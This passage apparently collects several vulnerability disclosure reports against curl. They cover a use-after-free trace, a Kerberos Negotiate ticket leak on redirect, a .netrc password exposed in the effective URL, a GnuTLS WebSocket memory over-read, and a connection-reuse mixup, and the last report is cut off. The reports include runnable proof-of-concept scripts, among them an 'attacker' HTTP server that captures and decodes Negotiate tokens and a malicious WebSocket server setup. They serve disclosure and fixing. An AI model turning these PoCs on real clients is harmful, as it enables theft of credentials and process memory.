del_per_transfer()                              src/tool_operate.c:240
└─ curl_easy_cleanup() -> Curl_close()          url.c:197
   └─ free(data)                                url.c:303        <- stream 3 pointer now dangling

PHASE 6: process exit, connection pool shutdown causes one last read which triggers the UAF
curl_share_cleanup()                            curl_share.c:370
└─ Curl_cpool_destroy()                         conncache.c:247
   └─ ... Curl_conn_shutdown()                  cfilters.c:225
      └─ cf_h2_shutdown()                       http2.c:2559
         └─ h2_progress_ingress()               http2.c:1865
            └─ h2_process_pending_input()       http2.c:487
               └─ nghttp2_session_mem_recv()                     server's HEADERS for stream 3
                  └─ on_begin_headers()         http2.c:1355
                     ├─ data_s = get_stream_user_data(3)   http2.c:1364   returns freed pointer
                     └─ H2_STREAM_CTX(ctx, data_s)         http2.c:1373   reads data_s->mid  <- USE AFTER FREE
```
Pointer #1 is stored in phase 1 and properly cleared in phases 3 and 4. Pointer #2 is stored in phase 4, after the clearing. Nothing clears it again before the free in phase 5.

Thank you for taking the time to read this report.

## Impact

Remote code execution on a victim client uploading a text file.

title: CVE-2026-94265: Authorization: Negotiate sent to foreign origin
body:
Hi all,

I've discovered that curl can be made to send an "Authorization: Negotiate" header, carrying a freshly minted Kerberos ticket for the victim's ambient identity, to a host chosen by an HTTP redirect, without --location-trusted. All the attacker has to do is put arbitrary userinfo in the Location header they redirect to. This contradicts the guarantee documented for CURLOPT_UNRESTRICTED_AUTH, which says that with the option unset libcurl "does not send custom nor internally generated Authorization: or Cookie: headers on requests done to other hosts than the one used for the initial URL".

I have an end-to-end PoC against a real KDC on pristine upstream d1823ebc17e5778c30f8a6b2221a057ec607a9b7 (8.23.0-DEV), a control showing the protection holds when the userinfo is removed, and a small fix that I have verified closes it without regressing either normal Negotiate or --location-trusted. Details below.

How it works
------------

The gate asks "do I have any credentials?" when it should ask "am I still on the original host?"

```
  https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L872-L878

    /* Either we have credentials for the origin we talk to or
       performing authentication is allowed here */
    if(data->state.creds || Curl_auth_allowed_to_host(data))
      result = output_auth_headers(data, conn, authhost, request,
                                   path_and_query, FALSE);
    else
      authhost->done = TRUE;
```

That "||" is the whole vulnerability. Either condition is enough.

The flow:

  1. You run `curl --negotiate -L http://intranet/` - Kerberos SSO, no password typed.
  2. `intranet` redirects you to `http://bob:alice@attacker.example/`.
  3. curl correctly drops *your* credentials, because it is a different host. But it then parses `bob:alice` out of the attacker's own URL and stores it in state.creds. That path has no origin check.
  4. Gate: credentials exist -> proceed. The origin check is never consulted.
  5. The Negotiate branch runs. It throws `bob:alice` away, goes to the KDC, and gets a fresh Kerberos ticket for HTTP/attacker.example. Sends it.

The attacker now holds a Kerberos AP-REQ for their own service, proving your identity.

What makes it odd is that a credential which is never used unlocks an authentication that does not use credentials. `bob:alice` is neither forwarded nor checked. Its only job is to be non-NULL.

Same PoC, one change, which is the proof that this and nothing else is the cause:

  | Redirect target                    | Attacker receives                                   |
  |------------------------------------|-----------------------------------------------------|
  | http://bob:alice@attacker.example/ | Authorization: Negotiate <ticket for HTTP/attacker> |
  | http://attacker.example/           | nothing                                             |


Code paths
----------

1. Application-set credentials ARE origin-checked, so yours are correctly dropped on the redirect.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/url.c#L1355-L1360

    if((CURL_EASY_STR(data, STRING_USERNAME) ||
        CURL_EASY_STR(data, STRING_PASSWORD) ||
        CURL_EASY_STR(data, STRING_BEARER) ||
        CURL_EASY_STR(data, STRING_SASL_AUTHZID) ||
        CURL_EASY_STR(data, STRING_SERVICE_NAME)) &&
       Curl_auth_allowed_to_origin(data, data->state.origin)) {
```

2. Credentials taken from the URL are NOT origin-checked. The redirect target is attacker-chosen, so this repopulates state.creds for the foreign origin.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/url.c#L1383-L1391

    if(!newcreds || !Curl_creds_has_user(newcreds)) {
      char *user = NULL;
      char *passwd = NULL;
      char *udecoded = NULL;
      char *pdecoded = NULL;
      CURLUcode uc;
  
      uc = curl_url_get(uh, CURLUPART_USER, &user, 0);
      if(uc && (uc != CURLUE_NO_USER))
```

3. The gate accepts that, and output_auth_headers() runs for the foreign origin.
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L874

4. The HTTPSIG branch guards against exactly this. The Negotiate branch directly below it does not - it only checks that the application did not set its own header.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L671-L704

  #ifndef CURL_DISABLE_HTTPSIG
    if((authstatus->picked == CURLAUTH_HTTPSIG) && !proxy) {
      /* HTTPSIG uses its own configured key material rather than
         data->state.creds. Do not let unrelated credentials from a
         redirected URL bypass the cross-host auth boundary. */
      if(Curl_auth_allowed_to_host(data)) {
        auth = "HTTPSIG";
        result = Curl_output_httpsig(data);
        if(result)
          return result;
      }
      else
        authstatus->done = TRUE;
    }
    else
  #endif
  #ifdef USE_SPNEGO
    if(authstatus->picked == CURLAUTH_NEGOTIATE) {
      if(
  #ifndef CURL_DISABLE_PROXY
        (proxy && !Curl_checkProxyheaders(data, conn,
                                          STRCONST("Proxy-authorization"))) ||
  #endif
        (!proxy && !Curl_checkheaders(data, STRCONST("Authorization")))) {
        auth = "Negotiate";
        result = Curl_output_negotiate(data, conn, proxy);
        if(result)
          return result;
      }
      else
        authstatus->done = TRUE;
    }
    else
  #endif
```

5. Negotiate needs no username, so the ambient credential cache is used. The credentials that unlocked the gate are explicitly discarded.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/vauth/spnego_gssapi.c#L92

    (void)creds;
```

6. The SPN is built from the CURRENT origin, which is the attacker's hostname.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http_negotiate.c#L77

      host = data->state.origin->hostname;
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http_negotiate.c#L126-L127

    result = Curl_auth_decode_spnego_message(data, creds, "HTTP",
                                             host, header, neg_ctx);
```

7. The boundary being bypassed.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/vauth/vauth.c#L140-L149

  bool Curl_auth_allowed_to_host(struct Curl_easy *data)
  {
    return Curl_auth_allowed_to_origin(data, data->state.origin);
  }
  
  bool Curl_auth_allowed_to_origin(struct Curl_easy *data,
                                   struct Curl_peer *origin)
  {
    return data->set.allow_auth_to_other_hosts ||
           Curl_peer_equal(data->state.initial_origin, origin);
```

8. Worth noting that a CUSTOM Authorization header is already blocked cross-host. Only the internally generated one is not.
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L1878-L1883

```
        else if((curlx_str_casecompare(&name, "Authorization") ||
                 curlx_str_casecompare(&name, "Cookie")) &&
                /* be careful of sending this potentially sensitive header to
                   other hosts */
                !Curl_auth_allowed_to_host(data))
          ;
```

Reproduction
------------

Verified on pristine upstream curl/curl d1823ebc17e5778c30f8a6b2221a057ec607a9b7 (8.23.0-DEV, GSS-API + SPNEGO, MIT krb5 1.22.2), and also on 557e43b237 of my own tree (8.22.1-DEV). Build with -DCURL_USE_GSSAPI=ON so that `curl -V` lists SPNEGO.

```
  VF_CURL=<curl-with-spnego> sh reproduce.sh exploit
  VF_CURL=<curl-with-spnego> sh reproduce.sh control
```

The script stands up a throwaway MIT Kerberos realm (KDC, one user principal, two service principals), kinits a victim who has never heard of attacker.poc.test, and runs curl against a legit origin that 301-redirects to an attacker origin. The only difference between the two arms is whether the Location header carries userinfo.

Results:

  exploit: attacker origin received Authorization: Negotiate (1060 b64 chars)
    AP-REQ principal fields: ['POC.TEST', 'HTTP', 'attacker.poc.test']
  control: attacker origin received NO Authorization header

The token is a SPNEGO wrapper (OID 1.3.6.1.5.5.2) over a krb5 AP-REQ (OID 1.2.840.113554.1.2.2) whose ticket sname is HTTP/attacker.poc.test in realm POC.TEST. legit.poc.test does not appear anywhere in it, so it is a newly minted ticket rather than a replay of the one sent to the first host. klist afterwards confirms the KDC issued HTTP/attacker.poc.test@POC.TEST to the victim, for a host the caller never asked to contact.

  reproduce.sh:
  ```sh
  #!/bin/sh
  # Reproduces the cross-origin SPNEGO/Negotiate leak in lib/http.c.
  #
  # Env overrides (defaults suit a Homebrew MIT krb5 on macOS):
  #   VF_CURL   - curl built with SPNEGO (`curl -V` must list GSS-API or SPNEGO)
  #   VF_WORK   - scratch dir                        (default /tmp/vf-nego)
  #   VF_KRB5   - MIT krb5 prefix                    (default /opt/homebrew/opt/krb5)
  #   VF_KDCP   - KDC port                           (default 19188)
  #   VF_APORT  - "legit" origin port                (default 19218)
  #   VF_BPORT  - "attacker" origin port             (default 19219)
  set -e
  MODE="$1"
  WORK="${VF_WORK:-/tmp/vf-nego}"
  KRB5="${VF_KRB5:-/opt/homebrew/opt/krb5}"
  KDCP="${VF_KDCP:-19188}"
  APORT="${VF_APORT:-19218}"
  BPORT="${VF_BPORT:-19219}"
  CURL_BIN="${VF_CURL:-curl}"
  MARKER="$WORK/attacker-received-negotiate"
  
  # Clean at the START of every arm: both arms share one work dir, so the control
  # must not inherit a marker left by the exploit arm.
  pkill -f "krb5kdc -n -P $WORK/kdc.pid" 2>/dev/null || true
  rm -rf "$WORK"
  mkdir -p "$WORK/db"
  
  # Exploit: the redirect Location carries unrelated userinfo, which makes
  # data->state.creds non-NULL for the foreign origin and satisfies the
  # `data->state.creds ||` half of the gate at lib/http.c:874.
  # Control: identical, but no userinfo -> the gate correctly blocks the header.
  if [ "$MODE" = "exploit" ]; then
    LOC="http://bob:alice@attacker.poc.test:$BPORT/step2"
  else
    LOC="http://attacker.poc.test:$BPORT/step2"
  fi
  
  # --- Throwaway Kerberos realm: test infrastructure only, NOT the target. ---
  cat > "$WORK/krb5.conf" <<EOF
  [libdefaults]
      default_realm = POC.TEST
      dns_lookup_kdc = false
      dns_lookup_realm = false
      rdns = false
  [realms]
      POC.TEST = {
          kdc = 127.0.0.1:$KDCP
      }
  [domain_realm]
      .poc.test = POC.TEST
      poc.test = POC.TEST
  EOF
  cat > "$WORK/kdc.conf" <<EOF
  [kdcdefaults]
      kdc_ports = $KDCP
      kdc_tcp_ports = $KDCP
  [realms]
      POC.TEST = {
          database_name = $WORK/db/principal
          key_stash_file = $WORK/db/stash
          acl_file = $WORK/db/kadm5.acl
          supported_enctypes = aes256-cts:normal
      }
  EOF
  export KRB5_CONFIG="$WORK/krb5.conf"
  export KRB5_KDC_PROFILE="$WORK/kdc.conf"
  export KRB5CCNAME="$WORK/victim.ccache"
  
  "$KRB5/sbin/kdb5_util" create -s -P testmaster -r POC.TEST >/dev/null
  # The victim's realm contains an SPN for the attacker's host. The victim has
  # never heard of it; only the KDC's realm membership matters.
  "$KRB5/sbin/kadmin.local" -q "addprinc -pw victimpass victim"            >/dev/null 2>&1
  "$KRB5/sbin/kadmin.local" -q "addprinc -randkey HTTP/legit.poc.test"     >/dev/null 2>&1
  "$KRB5/sbin/kadmin.local" -q "addprinc -randkey HTTP/attacker.poc.test"  >/dev/null 2>&1
  "$KRB5/sbin/krb5kdc" -n -P "$WORK/kdc.pid" > "$WORK/kdc.log" 2>&1 &
  KDC_PID=$!
  i=0; while [ $i -lt 30 ]; do i=$((i+1)); sleep 0.1; done
  printf 'victimpass\n' | "$KRB5/bin/kinit" victim >/dev/null
  
  # --- Origin A ("legit"): redirects to origin B. ---
  cat > "$WORK/a.py" <<EOF
  import http.server, sys
  class H(http.server.BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(301)
          self.send_header("Location", "$LOC")
          self.send_header("Content-Length", "0")
          self.end_headers()
      def log_message(self, *a): pass
  http.server.HTTPServer(("127.0.0.1", $APORT), H).serve_forever()
  EOF
  
  # --- Origin B ("attacker"): reached only via A's redirect. Records whether the
  #     victim's client presented an ambient-credential Negotiate token. ---
  cat > "$WORK/b.py" <<EOF
  import http.server, sys
  class H(http.server.BaseHTTPRequestHandler):
      def do_GET(self):
          a = self.headers.get("Authorization")
          if a and a.lower().startswith("negotiate"):
              open("$MARKER", "w").write(a.split(" ", 1)[1].strip())
          self.send_response(200)
          self.send_header("Content-Length", "0")
          self.end_headers()
      def log_message(self, *a): pass
  http.server.HTTPServer(("127.0.0.1", $BPORT), H).serve_forever()
  EOF
  
  python3 "$WORK/a.py" & A_PID=$!
  python3 "$WORK/b.py" & B_PID=$!
  i=0; while [ $i -lt 20 ]; do i=$((i+1)); sleep 0.1; done
  
  : > "${VF_READY:-/dev/null}"
  
  # Exercise the shipped curl exactly ONCE. Identical command in both arms.
  # --negotiate selects SPNEGO; note the ABSENCE of --location-trusted.
  timeout 20 "$CURL_BIN" -sS --negotiate --location \
    --resolve "legit.poc.test:$APORT:127.0.0.1" \
    --resolve "attacker.poc.test:$BPORT:127.0.0.1" \
    "http://legit.poc.test:$APORT/start" -o /dev/null 2>"$WORK/curl.err" || true
  
  { kill "$A_PID" "$B_PID" "$KDC_PID"; wait; } 2>/dev/null || true
  
  if [ -f "$MARKER" ]; then
    echo "$MODE: attacker origin received Authorization: Negotiate ($(wc -c < "$MARKER" | tr -d ' ') b64 chars)"
    python3 - "$MARKER" <<'PY'
  import base64, sys
  raw = base64.b64decode(open(sys.argv[1]).read())
  runs, i = [], 0
  while i < len(raw):
      if raw[i] == 0x1b and 0 < raw[i+1] < 64:
          s = raw[i+2:i+2+raw[i+1]]
          if all(32 <= c < 127 for c in s) and len(s) >= 4:
              runs.append(s.decode()); i += 2 + raw[i+1]; continue
      i += 1
  print("  AP-REQ principal fields:", runs)
  PY
  else
    echo "$MODE: attacker origin received NO Authorization header"
  fi
  ```


Suggested fix
-------------


```
  diff --git a/lib/http.c b/lib/http.c
  index 3ed023753d..4b31cc2376 100644
  --- a/lib/http.c
  +++ b/lib/http.c
  @@ -691,7 +691,8 @@ static CURLcode output_auth_headers(struct Curl_easy *data,
         (proxy && !Curl_checkProxyheaders(data, conn,
                                           STRCONST("Proxy-authorization"))) ||
   #endif
  -      (!proxy && !Curl_checkheaders(data, STRCONST("Authorization")))) {
  +      (!proxy && !Curl_checkheaders(data, STRCONST("Authorization")) &&
  +       Curl_auth_allowed_to_host(data))) {
         auth = "Negotiate";
         result = Curl_output_negotiate(data, conn, proxy);
         if(result)
  @@ -704,10 +705,14 @@ static CURLcode output_auth_headers(struct Curl_easy *data,
   #endif
   #ifdef USE_NTLM
     if(authstatus->picked == CURLAUTH_NTLM) {
  -    auth = "NTLM";
  -    result = Curl_output_ntlm(data, proxy);
  -    if(result)
  -      return result;
  +    if(proxy || Curl_auth_allowed_to_host(data)) {
  +      auth = "NTLM";
  +      result = Curl_output_ntlm(data, proxy);
  +      if(result)
  +        return result;
  +    }
  +    else
  +      authstatus->done = TRUE;
     }
     else
   #endif
```

Cheers,
Josh

## Impact

The attacker controls the long-term key for the SPN they redirected you to (think: website with an open redirect vulnerability), so they can decrypt the AP-REQ and learn your authenticated identity. With CURLOPT_GSSAPI_DELEGATION the ticket is forwardable, and on Windows SSPI an unknown SPN falls back to NTLM, which yields a relay-able NTLM exchange. I did not demonstrate either of those two outcomes, so they are not reflected in the CVSS score above.

Note this is not the classic "credential leak on redirect" pattern where an existing header value is forwarded to a new host. curl performs a complete, fresh authentication handshake against the attacker's service on your behalf, so the exposure is not bounded by what you previously sent.

title: CVE-2026-94266: password leak in CURLINFO_EFFECTIVE_URL
body:
A `.netrc`-sourced password, injected into the live URL handle at login time, survives an ordinary same-host relative `Location:` redirect and ends up verbatim in `data->state.url`, so it is exposed via `CURLINFO_EFFECTIVE_URL`, `curl -w '%{url_effective}'`, and verbose (`-v`) output.

## Affected code

https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/url.c#L1325-L1332

```c
      result = Curl_creds_merge(ncreds_out->user, ncreds_out->passwd,
                                *pcreds, CREDS_NETRC, pcreds);
      if(result)
        goto out;
      /* for updated strings, we update them in the URL */
      uc = curl_url_set(data->state.uh, CURLUPART_USER,
                        Curl_creds_user(*pcreds), CURLU_URLENCODE);
      if(!uc)
        uc = curl_url_set(data->state.uh, CURLUPART_PASSWORD,
                          Curl_creds_passwd(*pcreds),
                          CURLU_URLENCODE);
```

https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L1244

https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L1298-L1306

https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/urlapi.c#L1334-L1401

https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/getinfo.c#L83-L86

## Details

1. `url_set_data_creds_netrc()` (lib/url.c:1325-1332) writes the `.netrc` user/password directly into `data->state.uh`, the handle later reused to compute the effective URL. It is never cleared.
2. On a redirect, `Curl_http_follow()` calls `curl_url_set(data->state.uh, CURLUPART_URL, newurl, ...)` (http.c:1244), reparsing the same, already-dirty handle with the `Location:` value.
3. For a relative `Location: /path`, `redirect_url()` (urlapi.c:1334) computes `cutoff = strchr(protsep, '/')` and copies `base[0..cutoff)`, i.e. `scheme://user:pass@host:port`, verbatim into the new URL before appending the new path (urlapi.c:1355-1362, 1391-1397). `CURLU_URLENCODE` only percent-escapes non-unreserved bytes, so a plain alphanumeric password passes through unchanged.
4. The result is read back and stored: `Curl_bufref_set(&data->state.url, follow_url, ...)` (http.c:1298) and `infof(data, "Issue another request to this URL: '%s'", follow_url)` (http.c:1306).
5. `CURLINFO_EFFECTIVE_URL` returns `Curl_bufref_ptr(&data->state.url)` unsanitized (getinfo.c:84).

An *absolute* `Location:` does not leak: `set_url()` fully resets the handle before parsing, so no stale userinfo carries forward. Only the relative-reference path is affected. The first-hop effective URL is also clean, since `data->state.url` is populated (url.c) before the netrc injection runs; the leak appears starting from the first redirect.

## Reproducer

`.netrc`:
```
machine 127.0.0.1
login netrcuser
password netrcSECRET123
```

Server: answers `/first` with `302 Found` + `Location: /newpath`.

```
curl -v -L --netrc-file netrc_test --netrc-optional \
  -w '\nEFFECTIVE_URL=%{url_effective}\n' http://127.0.0.1:25036/first
```

Captured output (built from clean upstream commit d1823ebc17):
```
* Issue another request to this URL: 'http://netrcuser:netrcSECRET123@127.0.0.1:25036/newpath'
...
EFFECTIVE_URL=http://netrcuser:netrcSECRET123@127.0.0.1:25036/newpath
```

Confirmed identically via direct libcurl API (`CURLOPT_NETRC=CURL_NETRC_OPTIONAL`, `CURLOPT_FOLLOWLOCATION=1`, then `curl_easy_getinfo(CURLINFO_EFFECTIVE_URL)`):
```
CURLINFO_EFFECTIVE_URL = http://netrcuser:netrcSECRET123@127.0.0.1:25036/newpath
RESULT: netrc password LEAKED into CURLINFO_EFFECTIVE_URL
```

## Suggested fix

Strip userinfo from `data->state.uh` before it is used to compute the redirect follow-URL / effective URL, the same way the Referer builder already does (`curl_url_set(u, CURLUPART_USER/PASSWORD, NULL, 0)`, http.c:1219-1221) and the non-tunnelling proxy request-target builder does (http.c:2161-2173). This needs to happen without disturbing the credentials curl still needs to send the actual `Authorization` header on the next hop.

## Impact

The impact is disclosure of `.netrc` usernames and passwords into places that applications commonly treat as safe URL metadata:

* `CURLINFO_EFFECTIVE_URL`
* `CURLINFO_REDIRECT_URL`, even without following the redirect
* `%{url_effective}` and `%{redirect_url}`
* verbose/debug output

A server can trigger this by returning a relative `Location:`. If the application records, displays, returns, or forwards these values to logs, monitoring systems, users, or another service, the netrc password can escape its intended credential store.

The server does not directly receive the password, and absolute cross-origin redirects do not carry it. Exploitation therefore needs a secondary observer of the URL metadata or logs. That makes it a real confidentiality flaw, but likely low severity rather than direct remote credential theft.
label: real

title: CVE-2026-107928: info leak uploading over WebSockets with GnuTLS
body:
## Summary:
When curl is built with GnuTLS, a malicious WebSocket server can make `curl -T <file> wss://...` send memory past curl's WebSocket send buffer. This is due to an out of bounds read in `gtls_send()`, which doesn't handle if `gnutls_record_send()` returns a number of bytes sent greater than the number of bytes it was given to send. GnuTLS does that after a blocked send. It takes two sends from different buffers to trigger, so I added an ASCII illustration of the control flow in the appendix to make it easier to follow.

GnuTLS is required for this bug, It doesn't work on OpenSSL. It also requires an upload of a few MB or more to a `wss://` URL on the attacker's server. So I'm submitting this as a Low.

As for how it happens, the server first stops reading, so curl's upload blocks on a full socket. The last `gnutls_record_send()` has by then encrypted a 16384 byte record that the socket doesn't take. GnuTLS keeps it and returns `GNUTLS_E_AGAIN`, and those bytes stay in curl's request buffer to be passed in again. The next `gnutls_record_send()` call sends the kept record and returns its length (16384) whatever buffer and length it was given. Normally that call is for the same bytes so it's ok. But if the server sends a WebSocket PING, curl answers with a PONG and `ws_flush()` sends it straight from the WebSocket send buffer, ahead of the request buffer. So the next call is `gnutls_record_send(PONG, 10)` and it returns 16384. There is a check here in `gtls_send()` but it's only a `DEBUGASSERT`. On a release build it just adds 16384 to the buffer pointer, subtracts it from the 10 bytes left, which wraps around and keeps looping. So then `gnutls_record_send()` encrypts and sends the next 16384 bytes of memory after the PONG until the socket is full again. The server can control how much it reads based on how much it reads before the PING. If the read gets to the end of the heap, curl segfaults.

For applications using curl as a library, if they call `curl_easy_send()` with a shorter buffer after `CURLE_AGAIN`, the same thing can happen. For example `curl_easy_send(buf, 5, &n)` can return `CURLE_OK` with `n` getting 131072.

## Affected version
8.22.0

## Steps To Reproduce:
The attached `evil-server.py` is a malicious server that triggers the bug. The script below should also reproduce the bug

```bash
wget 'https://curl.se/download/curl-8.22.0.tar.gz'
sha1sum curl-8.22.0.tar.gz # should be 284e444b67f676a281906cfc86e9672780555cd4
tar xf curl-8.22.0.tar.gz
mkdir build ; cd build
# build with GnuTLS instead of OpenSSL
CC=clang CFLAGS="-O2 -g" LDFLAGS="-Wl,-rpath,/opt/curl-gnutls/lib" \
    ../curl-8.22.0/configure --prefix=/opt/curl-gnutls \
      --enable-static --enable-shared --disable-docs --disable-manual \
      --with-gnutls --without-openssl --with-zlib --with-brotli --with-zstd --with-libidn2 \
      --with-nghttp2 --with-libpsl --with-libssh2 --with-gssapi \
      --enable-ldap --enable-ldaps --enable-websockets --enable-mqtt --enable-ipfs \
      --enable-ntlm --enable-smb --enable-httpsig --enable-httpsrr --enable-ssls-export \
    && make -j"$(nproc)"
# a 32 MB file of one repeated byte, so that anything else the server receives is easy to spot
head -c 33554432 /dev/zero | tr '\0' A > As.bin
# start the malicious server, see attached evil-server.py (put it in this directory)
python3 evil-server.py & sleep 1
# we use --insecure because the server's cert is self signed, and -sS to keep the progress meter out of
# the server's output. Neither is necessary to trigger the bug.
./src/curl --insecure -sS -T As.bin wss://127.0.0.1:19239/
```

The PoC server looks at what it receives and if it prints if it gets something it wasn't supposed to (not part of the uploaded file).

```
[srv] upgraded to WebSocket, not reading, so that curl's send blocks
[srv] reading 131072 bytes, then sending PING number 151
[srv] PING number 151: 2359296 bytes into the upload the stream stops being WebSocket frames of 0x41
[srv] LEAK: at least 65536 bytes of curl's memory arrived instead
[srv] it starts with old data from curl's WebSocket send buffer; 49152 bytes further on comes this:
  +00c000  00 00 00 00 00 00 00 31 00 01 00 00 00 00 00 00  .......1........
  +00c010  00 00 00 00 00 00 00 ff ff 00 00 00 00 00 00 00  ................
  +00c020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 89  ................
  +00c030  04 70 69 6e 67 00 00 00 00 00 00 00 00 00 00 00  .ping...........
  ...
curl: (56) Recv failure: Connection reset by peer
```

(Here the send buffer's 64 KB heap chunk ends at +00c000. So after that we can see the leaked malloc header and the `struct buf_chunk` of the next allocation, which holds the PING the server sent. With `-v --trace-config ssl`, curl shows the send as `gtls_send(len=1304) -> 0, 114688`)

I also attached a .tar.gz with a Dockerfile that builds a reproducer container.

## Appendix

```
PHASE 1: upload runs, server isn't reading
Curl_sendrecv()                                        transfer.c:354
└─ sendrecv_ul() -> Curl_req_send_more()               transfer.c:375 -> request.c:458
   ├─ add_from_client() -> ... -> cr_ws_read()         request.c:351 -> ws.c:1202    next 64 KB of the file
   │  ├─ ws_enc_write_head(), ws_enc_write_payload()   ws.c:1259, 1265  -> ws->sendbuf, as one masked BINARY frame
   │  └─ Curl_bufq_cread(&ws->sendbuf, buf, blen)      ws.c:1274        frame bytes -> req.sendbuf (65536 bytes)
   └─ req_flush() -> req_send_buffer_flush()           request.c:298 -> request.c:243
      ├─ xfer_send() -> Curl_xfer_send()               request.c:251 -> transfer.c:806
      │  └─ ... ssl_cf_send()                          vtls.c:1113
      │     └─ gtls_send(buf=req.sendbuf, blen=65536)  vtls.c:1156 -> gtls.c:2072
      │        ├─ gnutls_record_send(buf, 65536)       gtls.c:2090      = 16384, record 1 sent
      │        ├─ gnutls_record_send(buf+16384, 49152)                  = 16384, record 2 sent
      │        ├─ gnutls_record_send(buf+32768, 32768)                  encrypts record 3 (16384 bytes)
      │        │  └─ gtls_push() -> send()             gtls.c:85        EAGAIN, the socket is full
      │        │  = GNUTLS_E_AGAIN                                      <- record 3 stays queued inside GnuTLS
      │        └─ return CURLE_OK, *pnwritten = 32768  gtls.c:2099      record 3's bytes are not counted
      └─ Curl_bufq_skip(&req.sendbuf, 32768)           request.c:255    so they stay in req.sendbuf for the retry

PHASE 2: server sends a PING
Curl_sendrecv()                                        transfer.c:354
└─ sendrecv_dl() -> Curl_xfer_write_resp()             transfer.c:368 -> transfer.c:297
   └─ ... ws_cw_write()                                ws.c:709
      ├─ ws_dec_pass() -> ws_cw_dec_next()             ws.c:747 -> ws.c:662   a PING
      │  └─ ws_enc_add_cntrl(CURLWS_PONG)              ws.c:689         PONG -> ws->pending
      └─ ws_flush()                                    ws.c:770 -> ws.c:1701
         ├─ ws_enc_add_pending()                       ws.c:1708        PONG (10 bytes) -> ws->sendbuf   <- the short buffer
         ├─ Curl_bufq_peek(&ws->sendbuf, &out, &outlen)  ws.c:1728      outlen = 1304 (the PONGs that queued up while the socket was full)
         └─ Curl_xfer_send(data, out, outlen)          ws.c:1744        straight to the connection, req.sendbuf has to wait
            └─ ... gtls_send(buf=out, blen=1304)       gtls.c:2072      remain = 1304
               ├─ gnutls_record_send(out, 1304)        gtls.c:2090      sends the queued record 3, doesn't look at out
               │  = 16384                                               <- more than remain
               ├─ DEBUGASSERT(nwritten <= remain)      gtls.c:2094      (not in release builds)
               ├─ buf = out + 16384                    gtls.c:2095      <- past the end of what is in ws->sendbuf
               ├─ remain = 1304 - 16384                gtls.c:2096      <- wraps to 0xffffffffffffc518
               ├─ gnutls_record_send(out+16384, remain)  gtls.c:2090    = 16384   <- OUT OF BOUNDS READ, encrypted and sent
               ├─ gnutls_record_send(out+32768, remain)                 = 16384   (the chunk out is in ends before out+65536)
               ├─ ...
               ├─ gnutls_record_send(out+114688, remain)                = GNUTLS_E_AGAIN, the socket is full again
               └─ return CURLE_OK, *pnwritten = 114688 gtls.c:2099
```

Record 3's bytes are given to GnuTLS in phase 1 and are meant to be offered again, from `req.sendbuf`, by the next call. In phase 2 the PONG gets there first, GnuTLS answers for record 3, and `gtls_send()` applies that answer to the PONG's buffer.

Thanks for taking the time to read this report.

## Impact

Disclosure of client process memory to a malicious `wss://` server, for libcurl built with GnuTLS (default on Debian and Ubuntu?), while uploading a file to that server. The server can control how much to read

title: CVE-2026-107929: local interface connection reuse mixup
weakness: Exposure of Data Element to Wrong Session
body:
## Summary:

When CURLOPT_INTERFACE is set with one of the documented prefixes (`if!`, `host!`, `ifhost!`), that binding is not part of the connection reuse key, so a later transfer asking for a different source can silently reuse an existing connection and go out from the earlier transfer's source address. `Curl_parse_interface()` parses the option into three separate values and `setstropt_interface()` stores them as STRING_DEVICE, STRING_INTERFACE and STRING_BINDHOST (lib/cf-socket.c:588, lib/setopt.c:155-183), and `bindlocal()` uses all three (lib/cf-socket.c:661-663), but `allocate_conn()` copies only STRING_DEVICE into `conn->localdev` (lib/url.c:1208-1209) and the local-binding test in `url_match_connect_config()` compares only that field and the local ports (lib/url.c:625-628). The unprefixed form is unaffected because it lands in STRING_DEVICE and is already in the key, which is why the control below behaves correctly. Reuse never rebinds a socket, so the second transfer keeps the first connection's source address, and for the same reason a non-matching `if!` skips the CURLE_INTERFACE_FAILED that CURLOPT_INTERFACE(3) documents. I know the comment at lib/url.c:619-624 calls this matching deliberately rough, but it assumes reuse will "reuse the exact same binding parameters", and here they are explicitly different and the miss goes in the unsafe direction.

## Affected version

8.9.0 through 8.22.0, and current master. I reproduced it on released 8.22.0 and on master efd42dfbbf656870f8885815d07b0d16a5771f69. On master 424aa994ac223c0f90839aadee0fb59595344fce I only read the source: `allocate_conn()` has moved to url.c:1147 but still copies STRING_DEVICE alone, and STRING_INTERFACE and STRING_BINDHOST are still read nowhere but the bind path. The 8.9.0 lower bound comes from reading commit 3060557af702dd59155ea703a0790455c2f49a59, which split the option into three strings without adding the two new ones to the reuse key; I did not run 8.9.0.

```
curl 8.22.0 (x86_64-pc-linux-gnu) libcurl/8.22.0 OpenSSL/3.0.13 zlib/1.3 zstd/1.5.5
Release-Date: 2026-09-02
```

Linux 6.8.0 x86_64, clang 18.1.3, built from the signed 8.22.0 release tarball. That build was configured with --enable-debug; the code above is not debug-conditional.

## Steps To Reproduce:

The server has to speak HTTP/1.1 keep-alive, otherwise nothing is reusable and the bug stays hidden. Minimal one:

```python
import http.server, socketserver
class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def do_GET(self):
        b = ("peer=%s\n" % self.client_address[0]).encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(b)))
